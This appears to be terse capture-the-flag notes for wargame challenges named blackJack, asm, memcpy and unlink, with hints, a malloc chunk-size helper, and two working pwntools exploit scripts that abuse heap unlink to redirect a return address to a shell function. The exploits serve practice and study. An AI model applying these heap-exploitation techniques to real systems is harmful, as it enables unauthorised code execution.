## blackJack
function betting is trick

## asm
syscall reference https://w3challs.com/syscalls/?arch=x86_64  

- push flag name to stack
- read flag
- output
- be careful about little endian  
    
## memcpy
assemble code mvntps is aligned to 0x10, you'd better know how to allocate malloc chunk before pwn it
```
def malloc_chunk_size(n):
	if n < 12:
		size=16
	else:
		if (n+4)%8==0:
			size=n+4
		else:
			size=8*((n+4)//8+1)
	return size

for i in range(3,13):
	p=2**i
	while malloc_chunk_size(p)%16 !=0:
		p=p+1
	print p
```
## unlink
main function disassem after unlink 
```
call    unlink
add     esp, 10h
mov     eax, 0
mov     ecx, [ebp-4]
leave
lea     esp, [ecx-4]
retn
```
##### Method 1
set ebp to heap address when return from unlink, just like we build a fake stack on heap (don't care esp, we don't need it anymore after returning from unlink )
```
from pwn import *
c=process("./unlink")
s=c.recvuntil("\n")
stackAdd=int(s[-11:-1],16)

s=c.recvuntil("\n")
heapAdd=int(s[-11:-1],16)

payload=pack(0x080484eb)
payload+=p32(heapAdd+12)
payload+="a"*8
payload+=p32(heapAdd+16)
payload+=p32(stackAdd-0x1c)# unlink return address, change it to heap
c.sendline(payload)
c.interactive()

```

##### Method 2
main return address is stored in `*(ebp-4)-4`, change the value in ebp-4 to heap address where we write shell address
```
from pwn import *
c=process("./unlink")
s=c.recvuntil("\n")
stackAdd=int(s[-11:-1],16)

s=c.recvuntil("\n")
heapAdd=int(s[-11:-1],16)

dic={
	0:p32(0x080484eb),
	16:p32(heapAdd+12),
	20:p32(stackAdd+0x10)
}
payload=fit(dic)
c.sendline(payload)
c.interactive()

```
